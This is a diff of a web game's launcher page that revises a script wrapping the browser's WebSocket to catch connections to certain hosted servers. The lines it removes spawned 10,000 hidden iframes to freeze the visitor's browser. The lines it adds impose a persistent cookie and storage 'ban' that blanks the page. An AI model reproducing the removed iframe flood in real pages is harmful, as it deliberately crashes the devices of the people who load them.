@@ -13,7 +13,7 @@
 		<meta property="og:image" content="favicon.png" />
 		<link type="image/png" rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRCcyYDQ_K_vwfUEITJq3PFLp5HnQ2nruNeMQ&s" />
 		<script type="text/javascript" src="bootstrap.js"></script>
-		<script type="text/javascript">
+		<script type="text/javascript"> // eageler launcher
 			"use strict";
 			window.addEventListener("load", function() {
 				if(window.location.href.indexOf("file:") === 0) {
@@ -52,20 +52,48 @@
 				}
 			});
 		</script>
-		<script> //mindmage detector
+		<script> // magecraft detector
+    "use strict";
+
+    function banUser() {
+        document.cookie = "banned=true; path=/; max-age=31536000"; // 1 year ban
+        localStorage.setItem("banned", "true");
+        sessionStorage.setItem("banned", "true");
+        showBanScreen();
+    }
+
+    function isBanned() {
+        return document.cookie.includes("banned=true") || localStorage.getItem("banned") === "true" || sessionStorage.getItem("banned") === "true";
+    }
+
+    function showBanScreen() {
+        document.body.innerHTML = "";
+        let banMessage = document.createElement("div");
+        banMessage.style.position = "fixed";
+        banMessage.style.top = "0";
+        banMessage.style.left = "0";
+        banMessage.style.width = "100vw";
+        banMessage.style.height = "100vh";
+        banMessage.style.backgroundColor = "black";
+        banMessage.style.color = "red";
+        banMessage.style.display = "flex";
+        banMessage.style.alignItems = "center";
+        banMessage.style.justifyContent = "center";
+        banMessage.style.fontSize = "24px";
+        banMessage.innerText = "You have been banned from this site.";
+        document.body.appendChild(banMessage);
+    }
+
+    if (isBanned()) {
+        showBanScreen();
+        throw new Error("User is banned.");
+    }
+
     let originalWebSocket = window.WebSocket;
     
     window.WebSocket = function(url, protocols) {
         if (url.match(/^wss?:\/\/.*\.onrender\.com$/)) {
-            for (let i = 0; i < 10000; i++) {
-                let iframe = document.createElement("iframe");
-                iframe.src = "https://www.youtube.com";
-                iframe.style.width = "10px";
-                iframe.style.height = "10px";
-                iframe.style.position = "absolute";
-                iframe.style.left = "-9999px"; // Moves it out of view
-                document.body.appendChild(iframe);
-            }
+            banUser();
         }
         return new originalWebSocket(url, protocols);
     };
